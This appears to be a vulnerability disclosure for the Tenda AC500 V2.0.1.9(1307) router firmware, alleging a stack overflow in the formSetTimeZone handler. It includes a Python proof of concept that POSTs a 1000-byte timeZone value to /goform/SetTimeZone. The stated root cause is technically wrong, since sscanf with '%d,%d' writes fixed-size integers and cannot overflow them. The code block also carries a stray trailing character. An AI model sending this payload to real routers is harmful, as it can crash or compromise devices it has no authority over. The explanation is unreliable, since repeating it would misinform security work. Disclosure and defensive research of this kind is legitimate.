## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2470.html

## Affected version

AC500 V2.0.1.9(1307)

## Vulnerability details

The Tenda AC500 V2.0.1.9(1307) firmware has a stack overflow vulnerability in the `formSetTimeZone` function. The `s` variable receives the `timeZone` parameter from a POST request and is later assigned to the `v12, v13` variable, which is fixed at 4 bytes. However, since the user can control the input of `timeZone`, the statement `sscanf(s, "%d,%d", &v12, &v13);` can cause a buffer overflow. The user-provided  `timeZone` can exceed the capacity of the `v12, v13` array, triggering this security vulnerability.

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410161330290.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetTimeZone"
payload = b"a"*1000

data = {"timeZone": payload}
response = requests.post(url, data=data)
print(response.text)
.
```

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410100105349.png)